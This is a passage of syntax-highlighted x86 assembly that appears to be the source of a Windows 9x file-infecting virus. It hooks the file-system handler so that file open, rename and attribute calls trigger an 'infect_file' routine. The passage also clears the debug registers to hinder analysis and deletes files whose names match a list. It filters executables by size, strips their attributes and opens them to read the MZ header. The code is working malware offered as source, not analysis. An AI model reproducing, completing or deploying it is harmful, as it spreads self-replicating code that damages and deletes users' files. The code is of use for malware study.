</span><span class="sc5">Client_Alt_GS</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">fault_handler</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pushf</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

                     </span><span class="sc1">;  db      0FFh                    +0</span><span class="sc0">
                     </span><span class="sc1">;  db      0FFh                    +1</span><span class="sc0">
                     </span><span class="sc1">;  db      ????Xxxx                +2</span><span class="sc0">
                     </span><span class="sc1">;  dw      OLD_DATA xor word(EIP)  +3 +4</span><span class="sc0">
                     </span><span class="sc1">;     hi_word = X</span><span class="sc0">
                     </span><span class="sc1">;  dw      ?                       +5 +6</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.Client_EIP</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFF0000h</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__go_next_handler</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__go_next_handler</span><span class="sc0">


        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111b</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000b</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111111110000b</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C483h</span><span class="sc0">

</span><span class="sc5">__exit_handler</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">popf</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__go_next_handler</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">popf</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">go_prev_fault</span><span class="sc0">


</span><span class="sc5">ifs_onstack_struc</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; saved ebp</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; return address</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; the address of the FSD function that is to be called for this API</span><span class="sc0">
</span><span class="sc5">_function</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; the function that is being performed</span><span class="sc0">
</span><span class="sc5">_drive</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; the 1-based drive the operation is being performed on (-1 if UNC)</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; the kind of resource the operation is being performed on</span><span class="sc0">
</span><span class="sc5">_codepage</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; the codepage that the user string was passed in on</span><span class="sc0">
</span><span class="sc5">_ioreq_ptr</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; pointer to IOREQ structure</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ifs_handler</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

</span><span class="sc5">x</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;[</span><span class="sc8">ebp</span><span class="sc4">]-</span><span class="sc2">401000h</span><span class="sc4">&gt;</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">entered</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__quit</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">entered</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._function</span><span class="sc0">

</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">36</span><span class="sc0">
</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">37</span><span class="sc0">
</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">33</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_OPEN</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__my_func</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_RENAME</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__my_func</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__my_func</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">entered</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

</span><span class="sc5">__quit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">go_old_ifs_handler</span><span class="sc0">


</span><span class="sc5">__my_func</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; !</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._drive</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__skip</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__skip_drive</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
                        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">__skip</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">
                        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">__skip</span><span class="sc0">

                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">__skip_drive</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">IFSMGR_UniToBCSPath</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000400041h</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._codepage</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0"> </span><span class="sc1">; BCS_WANSI/BCS_OEM</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filename_size</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; max name length</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._ioreq_ptr</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">    </span><span class="sc1">; filename</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; skip "</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; uni-str</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; output-str</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_UniToBCSPath</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">

</span><span class="sc5">__skip</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xor_copy</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">replace_proc</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; |-))</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0">     </span><span class="sc1">; hsra</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindfirst</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindclose</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
</span><span class="sc5">__5</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__5</span><span class="sc0">
</span><span class="sc5">__6</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__6</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">shortname</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">short_name_len</span><span class="sc4">+</span><span class="sc5">short_ext_len</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">short_name_len</span><span class="sc0">
</span><span class="sc5">__b</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__a</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__c</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">__b</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__b</span><span class="sc0">
</span><span class="sc5">__c</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">shortname</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">short_name_len</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">short_ext_len</span><span class="sc0">
</span><span class="sc5">__d</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__a</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__d</span><span class="sc0">
</span><span class="sc5">__a</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">shortname</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kewl_names</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_in_list</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">suck_names</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_in_list</span><span class="sc0">
                        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">__good_file</span><span class="sc0">

        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fdelete</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
                        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">
</span><span class="sc5">__good_file</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">

        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'m0z.'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">infect_minsize</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16384</span><span class="sc0">             </span><span class="sc1">; 16K</span><span class="sc0">
</span><span class="sc5">infect_maxsize</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">100</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">     </span><span class="sc1">; 100M</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dta.dta_filesize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">infect_minsize</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">infect_maxsize</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fsetattr</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fopen</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__restattr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">mz</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">; filepos</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">

